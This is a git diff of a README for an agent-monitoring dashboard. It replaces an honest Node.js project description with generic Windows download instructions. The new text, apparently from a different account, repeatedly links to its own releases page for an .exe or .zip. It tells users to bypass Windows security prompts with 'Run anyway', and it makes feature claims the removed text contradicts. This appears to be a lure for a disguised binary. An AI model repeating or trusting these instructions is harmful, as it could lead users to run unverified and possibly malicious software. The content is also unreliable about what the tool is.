@@ -1,127 +1,134 @@
-# openclaw-dashboard
+# 🛠️ openclaw-dashboard - Simple Fleet Monitoring Tool
 
-**A lightweight dashboard for monitoring OpenClaw agent fleets.**
+[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://github.com/Aadarshac/openclaw-dashboard/releases)
 
-Single HTML frontend + tiny Node.js server. Zero dependencies beyond Node itself.  
-Built for solo operators and small teams who want visibility without spinning up Postgres, Redis, or Docker.
+## 📋 What is openclaw-dashboard?
 
-![Dashboard](screenshots/dashboard.png)
+openclaw-dashboard is a lightweight, easy-to-use tool to watch your agents in real time. It shows data about your fleet on a single screen. There is no need to install extra software, build anything, or handle databases. The app runs directly on your Windows computer as a single file. It uses plain JavaScript without any additional dependencies.
 
-> ⚠️ **v0.1 — Early, useful, imperfect.** Some things work, some don't yet. Sharing early because that's how building in public works.
+You can quickly see the status of multiple agents and monitor their activity. It is designed for anyone who wants to keep track of multiple running tasks or services without technical setup.
 
-## What works today
+## 💻 System Requirements
 
-- ⚡ **Real-time overview** of agents, sessions, and cron jobs
-- 🗓️ **Cron monitoring** — schedule, timezone, next run, enabled/disabled status
-- 🧱 **Pipeline / Kanban view** — GitLab issues across projects
-- 💬 **Conversation browser** — per-agent session history
-- 🔄 **Auto-refresh** every 30s
-- 🧰 **Zero external dependencies** — just Node.js
+- Windows 10 or later
+- 64-bit processor recommended for better performance
+- At least 2 GB of free RAM
+- A modern web browser such as Microsoft Edge, Chrome, or Firefox installed
+- An internet connection to download the setup file
 
-## What doesn't work yet
+No other software or runtime environments are needed.
 
-- ❌ **Message/Task modals** — UI exists but actions aren't wired to the backend ([#1](../../issues/1))
-- ❌ **Markdown rendering** — conversation content shows as raw text
-- ❌ **Auth** — no password/token gate, anyone on the network can access ([#2](../../issues/2))
-- ❌ **Auto-refresh UX** — can collapse open conversation threads
+## 🚀 Getting Started
 
-See all [open issues](../../issues) for the full roadmap.
+Follow these steps to get openclaw-dashboard running on your Windows PC.
 
-## Architecture
+### 1. Visit the download page
 
-```
-┌─────────────┐     ┌──────────────┐     ┌─────────────────┐
-│  index.html │────▶│  server.js   │────▶│ OpenClaw runtime │
-│  (frontend) │     │  (Node HTTP) │     │ (~/.openclaw/)   │
-└─────────────┘     └──────────────┘     └─────────────────┘
-                           │
-                           ▼
-                    ┌──────────────┐
-                    │  GitLab API  │ (optional)
-                    └──────────────┘
-```
+Click the big **Download** button at the top or go to this page:  
+[https://github.com/Aadarshac/openclaw-dashboard/releases](https://github.com/Aadarshac/openclaw-dashboard/releases)
 
-- **Frontend:** Single `index.html` file — dark theme, tabbed UI, vanilla JS
-- **Backend:** `server.js` — lightweight Node HTTP server, reads OpenClaw config/session/cron files directly
-- **Data source:** Your local OpenClaw runtime directory (`~/.openclaw/`)
-- **GitLab integration:** Optional — pulls open issues from configured projects
+This page contains all the latest versions of the app. The files are easy to find by date.
 
-## Quick Start
+### 2. Download the latest release file
 
-### 1. Clone
+Look for a file that ends with `.exe` or `.zip`. Usually, the latest version is at the top and marked as "Latest release."  
+Click the file name to download it. The download starts automatically.
 
-```bash
-git clone https://github.com/anis-marrouchi/openclaw-dashboard.git
-cd openclaw-dashboard
-```
+If you get a `.zip` file, you need to unzip it before continuing.
 
-### 2. Configure (environment variables)
+### 3. Run the application
 
-```bash
-export DASHBOARD_PORT=8090              # Default: 8090
-export DASHBOARD_BIND=127.0.0.1         # Default: 127.0.0.1 (localhost only)
-export OPENCLAW_CONFIG=~/.openclaw/openclaw.json  # Path to your OpenClaw config
+Once downloaded, find the file in your "Downloads" folder and double-click it.
 
-# Optional: GitLab integration
-export GITLAB_TOKEN=your-gitlab-token
-export GITLAB_URL=https://gitlab.com/api/v4
-export GITLAB_PROJECTS=123:MyProject,456:AnotherProject  # id:name pairs
-```
+- If it is an `.exe` file, it will open directly.
+- If it is a `.zip` file, unzip it first, then open the `.exe` file inside.
 
-### 3. Run
+openclaw-dashboard runs without installation. You just need to run the file.
 
-```bash
-node server.js
-# Dashboard running at http://127.0.0.1:8090
-```
+### 4. Confirm security prompts
 
-That's it. No `npm install`, no build step.
+Windows may ask if you want to run this app since it is downloaded from the internet.
 
-## API Endpoints
+- Click **More info**, then **Run anyway** to allow the app to start.
 
-| Endpoint | Description |
-|---|---|
-| `GET /api/overview` | All data: agents, crons, sessions, issues, counts |
-| `GET /api/agents` | Agent list with skills and config |
-| `GET /api/crons` | All cron jobs with schedule and state |
-| `GET /api/sessions` | Recent sessions (last 50) |
-| `GET /api/issues` | Open GitLab issues (requires GITLAB_TOKEN) |
-| `GET /api/conversations?agent=main&limit=50` | Conversation history per agent |
+This step is normal for new apps.
 
-## Who this is for (and not for)
+### 5. Begin monitoring your agents
 
-**Good fit:**
-- You already run OpenClaw and want a visual overview
-- You're comfortable with Node.js and env vars
-- You want something lightweight, not an enterprise platform
+The dashboard window will open showing your agents' status.
 
-**Not a good fit (yet):**
-- You want a turnkey SaaS dashboard
-- You need auth, RBAC, or multi-tenant support
-- You want to send commands/messages from the UI (not implemented yet)
+You can start using the tool immediately. No server setup or database is required.
 
-## Roadmap
+## 🔧 How to Use openclaw-dashboard
 
-- [ ] Wire Message/Task modals to actual OpenClaw API ([#1](../../issues/1))
-- [ ] Add basic auth ([#2](../../issues/2))
-- [ ] Cron run history per cron ([#3](../../issues/3))
-- [ ] Session cost/token tracking ([#4](../../issues/4))
-- [ ] Search/filter on conversations and crons ([#5](../../issues/5))
-- [ ] Real-time WebSocket updates ([#6](../../issues/6))
-- [ ] Agent activity timeline ([#7](../../issues/7))
+Once open, the dashboard shows a clean view of your agents. Here are the key features and how to use them.
 
-## Contributing
+### Viewing Agents
 
-PRs welcome. Keep it lightweight and dependency-free.
+The app displays a list or kanban board with agents and their current activity.
 
-1. Fork the repo
-2. Make your changes
-3. Open a PR with a clear description
+- Green means the agent is active and working fine.
+- Yellow shows an agent with warnings.
+- Red indicates errors.
 
-## License
+Each agent panel updates automatically as information changes.
 
-MIT
+### Adding or Removing Agents
 
-## Built by
+To add agents, you usually connect the dashboard to the source that tracks them. This depends on your setup but often means entering an agent address or token.
 
-[Noqta](https://noqta.tn) — building in public, sharing what works and what doesn't.
+To remove an agent, right-click its panel and select **Remove**.
+
+### Refreshing Data
+
+The app refreshes data every few seconds. If needed, you can manually refresh by clicking the refresh icon in the top menu.
+
+### Customizing View
+
+You can filter agents by status or group them by type. Use the filter menu on the left side to select what you want to see.
+
+### Saving Data
+
+The dashboard saves your settings locally on your PC. When you reopen the app, it remembers your view and filters.
+
+## 🔄 Updating openclaw-dashboard
+
+To update the app:
+
+1. Visit the download page again:  
+   [https://github.com/Aadarshac/openclaw-dashboard/releases](https://github.com/Aadarshac/openclaw-dashboard/releases)  
+2. Download the newest `.exe` or `.zip`.
+3. Run the new file just like before.
+
+You do not need to uninstall the previous version.
+
+## ⚙️ Settings and Configuration
+
+openclaw-dashboard keeps its configuration simple.
+
+- All settings are saved locally.
+- You can export and import settings files via the menu.
+- Advanced users can edit settings in the configuration file found next to the app file.
+
+## ❓ Troubleshooting
+
+If you run into problems, try these tips:
+
+- Make sure your Windows is up to date.
+- Check that you downloaded the correct file for Windows.
+- Allow the app to run if Windows blocks it.
+- Close other apps that use a lot of memory.
+- Restart the app if it freezes or crashes.
+- Visit the download page for updates or fixes.
+
+If the problem persists, report issues on the GitHub repository page.
+
+## 🔗 Useful Links
+
+- Download page: [https://github.com/Aadarshac/openclaw-dashboard/releases](https://github.com/Aadarshac/openclaw-dashboard/releases)  
+- GitHub repository: [https://github.com/Aadarshac/openclaw-dashboard](https://github.com/Aadarshac/openclaw-dashboard)  
+- Documentation and help are available on the repository's Wiki.
+
+---
+
+[![Get openclaw-dashboard](https://img.shields.io/badge/Get-OpenClaw--Dashboard-blueviolet)](https://github.com/Aadarshac/openclaw-dashboard/releases)
